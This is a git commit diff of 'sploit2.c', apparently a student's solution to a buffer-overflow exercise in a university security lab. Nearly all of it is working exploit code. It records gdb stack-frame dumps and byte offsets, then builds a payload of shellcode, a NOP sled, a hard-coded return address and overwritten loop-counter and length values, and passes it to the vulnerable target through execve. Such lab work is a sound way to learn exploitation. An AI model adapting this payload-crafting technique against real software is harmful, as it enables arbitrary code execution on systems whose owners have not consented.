ad5b9d80c67da3e7f06ac78140183411e8ae2781
YangChen93 <robbie2012dou@gmail.com>
2017-01-31 21:03:51 -0500

    fixed sploit2.c

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -8,25 +8,27 @@
 
 
 /*
-Stack level 0, frame at 0x2021ff00:
- rip = 0x400bb5 in foo (target2.c:11); saved rip = 0x400c75
- called by frame at 0x2021ff30
+(gdb) info frame
+Stack level 0, frame at 0x2021fe90:
+ rip = 0x400b63 in lab_main (target2.c:23); saved rip 0x400916
+ called by frame at 0x2021fec0
  source language c.
- Arglist at 0x2021fef0, args: arg=0x7fffffffe2ec "test"
- Locals at 0x2021fef0, Previous frame's sp is 0x2021ff00
+ Arglist at 0x2021fe80, args: argc=2, argv=0x7fffffffded8
+ Locals at 0x2021fe80, Previous frame's sp is 0x2021fe90
  Saved registers:
-  rbp at 0x2021fef0, rip at 0x2021fef8
+  rbp at 0x2021fe80, rip at 0x2021fe58
+
 
 
 
 */
-//buffer is located at 0x2021fde0
-//len is stored at 0x2021fee8
-//i is stored at 0x2021feec
+//buffer is located at 0x2021fd40
+//len is stored at 0x2021fe4c
+//i is stored at 0x2021fe48
 
 
-//buf to len is 264 bytes
-//buf to i is 268 bytes
+//buf to len is 268 bytes
+//buf to i is 264 bytes
 //buf to foo's rip is 280 bytes 
 
 
@@ -37,56 +39,45 @@ main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
-	char tmp[283];
+	unsigned char tmp[283];
 	int i,j,k;
-	//unsigned char NOP[] = '\x90';
 	
-	for (int i=0; i<128; i++){
-		tmp[i]='\x90';
+	for (k=0; k<283; k++){
+		tmp[k]= '\x00';
 	}
+
 	strcat(tmp, shellcode);
 	
+	for (i=45; i<181; i++){
+		tmp[i]='\x90';
+	}
+
+	tmp[181] = '\x40';
+	tmp[182] = '\xfd';
+	tmp[183] = '\x21';
+	tmp[184] = '\x20';
 	
-	for (int j=173; j<264; j++){
+	for (j=185; j<264; j++){
 		tmp[j]= '\x90';		
 	}
 
-	tmp[252] = '\xe0';
-	tmp[253] = '\xfd';
-	tmp[254] = '\x21';
-	tmp[255] = '\x20';
 
-//change len=283, 283=0x011b
-	tmp[264]='\x1b';
+	//change i=267=0x010b, which means it will skip the actual i and go to "len" directly
+	tmp[264]='\x0b';
 	tmp[265]='\x01';
 	tmp[266]='\x90';
 	tmp[267]='\x90';
 
-//keep i the current value (=268=0x010c)
-	tmp[268]='\x0c';
+	//change len=283=0x010b
+	tmp[268]='\x1b';
 	tmp[269]='\x01';
-	tmp[270] = '\x90';
-
-	for (int k=271; k<283; k++){
-		tmp[k]= '\x90';
-	}
-tmp[280] = '\xe0';
-tmp[281] = '\xfd';
-tmp[282] = '\x21';
-tmp[283] = '\x20';
-
-	//tmp[283] = '\x00';
-	
-
-	
-
 
 	args[0] = TARGET;
 	args[1] = tmp;
 	args[2] = NULL;
 
 	env[0] = &tmp[283];
-	env[1] = &tmp[0];
+	env[1] = &tmp[173];
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
